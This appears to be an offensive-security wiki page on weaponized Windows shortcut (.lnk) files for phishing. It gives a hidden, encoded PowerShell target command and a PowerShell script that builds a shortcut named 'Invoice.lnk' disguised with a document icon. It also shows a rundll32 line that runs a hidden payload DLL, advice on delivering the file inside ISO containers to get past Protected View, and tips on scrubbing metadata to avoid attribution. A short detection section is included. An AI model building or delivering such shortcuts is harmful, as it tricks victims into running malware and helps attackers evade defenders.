**LNK payloads** — a Windows shortcut (`.lnk`) whose target runs an arbitrary command. LNKs carry a custom icon (so they can look like a PDF/document), hide their real command line, and are the usual "visible file" inside an [ISO/container](ISO%20and%20Container%20Files.md).

## How it works

A `.lnk` stores a target executable + arguments + icon + working dir. Point the target at a living-off-the-land binary (`powershell.exe`, `cmd.exe`, `rundll32.exe`, `mshta.exe`, `conhost.exe`) with arguments that fetch/run your payload, and give it a document icon. Double-click → your command runs.

## Setup

**PowerShell one-liner target:**

```text

Target:  C:\Windows\System32\cmd.exe /c powershell -nop -w hidden -e <BASE64>
Icon:    %SystemRoot%\System32\imageres.dll,-3 (a document icon)

```

Build programmatically (run on Windows):

```powershell

$w = New-Object -ComObject WScript.Shell
$s = $w.CreateShortcut("$PWD\Invoice.lnk")
$s.TargetPath = "C:\Windows\System32\cmd.exe"
$s.Arguments  = '/c powershell -nop -w hidden -e <BASE64>'
$s.IconLocation = "imageres.dll,-3"
$s.WorkingDirectory = "C:\Windows\System32"
$s.Save()

```

Or with tooling:

```bash

# lnk2pwn, LNKUp, or nishang's Out-Shortcut generate weaponized shortcuts
# Run the hidden payload that ships alongside the LNK in the same container:
#   Arguments: /c start rundll32 .\payload.dll,EntryPoint

```

**Common pattern inside a container:** the LNK calls `rundll32`/`powershell` against a **hidden** sibling file (`payload.dll`/`.exe` with `attrib +h`), keeping the malicious binary out of the victim's view.

## Delivery

- Almost always shipped **inside** an [ISO/IMG/VHD](ISO%20and%20Container%20Files.md) or ZIP so the extracted LNK avoids Protected View; a bare emailed `.lnk` is often stripped by gateways.
- Match icon + filename to the pretext (`Invoice.pdf.lnk` with a PDF icon; Windows hides the `.lnk` extension).

## Detection & OPSEC

- LNKs record build artifacts (machine SID, MAC address, volume serial, hostname) - **scrub metadata** or build on a throwaway VM; defenders and IR use these for attribution.
- Strong hunt: `explorer.exe` launching a `.lnk` that spawns `powershell`/`rundll32`/`mshta` with encoded args, especially from a mounted image or Downloads.
- Blue team: `LECmd`/`lnkparse` dump LNK targets + metadata; alert on LOLBins spawned from shortcuts.

## References

- The Hacker Recipes - Initial access (phishing) - https://www.thehacker.recipes/infra/phishing
- lnk2pwn - https://github.com/tommelo/lnk2pwn
- Nishang (Out-Shortcut) - https://github.com/samratashok/nishang
- LECmd (Eric Zimmerman) - https://ericzimmerman.github.io/
